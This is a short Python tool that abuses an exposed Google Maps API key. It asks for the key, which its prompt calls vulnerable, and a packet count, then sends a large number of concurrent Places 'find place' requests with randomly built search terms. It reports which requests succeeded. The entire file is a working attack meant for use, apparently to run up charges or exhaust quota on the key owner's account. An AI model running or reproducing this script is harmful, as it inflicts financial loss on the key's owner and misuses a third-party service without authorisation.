#!/usr/bin/python3
import grequests, warnings, json, sys, os, random, colorama
from colorama import Fore
colorama.init(autoreset=True)

def exception_handler(request, exception):
    print(Fore.RED + "Request Failed")

def get_searchterm():
    country = open("datasets/countries.txt","r")
    country_line = next(country)

    building = open("datasets/buildings.txt","r")
    building_line = next(building)

    for i, c_line in enumerate(country,2):
        if random.randrange(i):
            continue
        country_line = c_line

    for j, b_line in enumerate(building,2):
        if random.randrange(j):
            continue
        building_line = b_line

    return f"{building_line.strip()} in {country_line.strip()}"

def generate_url(apikey, term):
    return f"https://maps.googleapis.com/maps/api/place/findplacefromtext/json?fields=formatted_address,name,rating,opening_hours,geometry&input={term}&inputtype=textquery&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to find place: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    urls = list()
    for i in range(count):
        url = generate_url(apikey, get_searchterm())
        urls.append(url)

    responses = (grequests.get(u, timeout=5) for u in urls)
    result_map = grequests.imap(responses, exception_handler=exception_handler, size=100)
    for result in result_map:
        if result is not None:
            if result.text.find("error_message") < 0:
                print(Fore.GREEN + f"[+] Packet Succeed: No Error Message")
            else:
                print(Fore.RED + f"[-] Packet Failed: Error Message Exist")
        else:
            print("[-] Packet Failed: Request Failed")

if __name__ == "__main__":
    do_attack()

